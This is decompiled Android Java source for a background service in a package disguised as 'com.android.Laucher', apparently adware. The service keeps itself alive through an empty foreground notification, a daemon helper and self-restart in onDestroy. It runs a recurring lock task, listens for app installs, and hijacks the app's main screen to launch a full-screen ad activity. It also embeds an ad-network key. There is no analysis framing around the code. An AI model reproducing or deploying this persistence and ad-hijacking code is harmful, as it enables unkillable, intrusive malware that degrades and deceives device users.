package com.android.Laucher;

import android.app.Activity;
import android.app.Application.ActivityLifecycleCallbacks;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import com.android.ad.du.ShowDuAd;
import com.android.daemon.Daemo;
import com.qq.gdt.utils.LockTask;
import com.qq.gdt.utils.UtilsClass;
import com.qq.gdt.utils.Utilstools;
import com.umeng.analytics.MobclickAgent;
import com.umeng.analytics.onlineconfig.a;
import java.util.Timer;

public class Se extends Service {
    public static final int FOREGROUND_ID = 0;
    private static final String TAG = "sp_sev";
    private static final long YOUR_PLACEMENT_ID = 1446789256130L;
    public static Timer mTimer = null;
    public static final String posId = "1133";
    public static Receiver receiver;
    private Context context;
    private String inmobiKey = "34c4a8f3990d4b369d8232279d87acd0";
    /* access modifiers changed from: private */
    public boolean isShowAd = false;
    ActivityLifecycleCallbacks mActivityLifecycleCallbacks = new ActivityLifecycleCallbacks() {
        public void onActivityStopped(Activity activity) {
        }

        public void onActivityStarted(Activity activity) {
            Log.e("yanghang", "onActivityStarted ActivityName: " + activity.getLocalClassName());
            if (!Se.this.isShowAd) {
                Se.this.isShowAd = true;
                Activity mActivity = activity;
            }
        }

        public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
        }

        public void onActivityResumed(Activity activity) {
            Log.e("yanghang", "onActivityResumed " + activity.getLocalClassName());
        }

        public void onActivityPaused(Activity activity) {
            Log.e("yanghang", "onActivityPaused " + activity.getLocalClassName());
            if (!activity.getLocalClassName().contains("MainActivity")) {
                LockTask.flag = false;
                activity.finish();
            }
        }

        public void onActivityDestroyed(Activity activity) {
            Log.e("yanghang", "onActivityDestroyed " + activity.getLocalClassName());
        }

        public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
            Log.e("yanghang", "onActivityCreated ActivityName: " + activity.getLocalClassName());
            Se.this.isShowAd = false;
            if (activity.getLocalClassName().contains("MainActivity")) {
                Intent intent = new Intent(Se.this.getApplicationContext(), ShowDuAd.class);
                intent.setFlags(268435456);
                Se.this.startActivity(intent);
                activity.finish();
            }
        }
    };
    private UtilsClass uc;

    public static void startTimer(Context context) {
        if (mTimer == null) {
            mTimer = new Timer();
            mTimer.schedule(new LockTask(context), 0, 10000);
        }
    }

    public void onCreate() {
        super.onCreate();
        startForeground(0, new Notification());
        Daemo.startMonda(getApplicationContext(), new Intent(getApplicationContext(), Se.class));
        IntentFilter intent = new IntentFilter("android.intent.action.TIME_TICK");
        intent.addAction("android.intent.action.PACKAGE_ADDED");
        intent.addDataScheme(a.b);
        if (receiver == null) {
            receiver = new Receiver();
        }
        getApplicationContext().registerReceiver(receiver, intent);
        getApplication().registerActivityLifecycleCallbacks(this.mActivityLifecycleCallbacks);
        this.uc = UtilsClass.getInstance();
        Log.e("HDJ", "--- 应用激活时，调用fill() ---");
        MobulaApplication.getDuNativeAd().fill();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        this.context = getApplicationContext();
        startTimer(this.context);
        MobclickAgent.onResume(this.context);
        return super.onStartCommand(intent, flags, startId);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        super.onDestroy();
        stopForeground(true);
        mTimer.cancel();
        mTimer.purge();
        mTimer = null;
        Intent intent = new Intent(this.context, Se.class);
        intent.setFlags(268435456);
        intent.setAction(Utilstools.ACTIONIAD);
        intent.setAction(Utilstools.ACTIONZDT);
        startService(intent);
    }
}
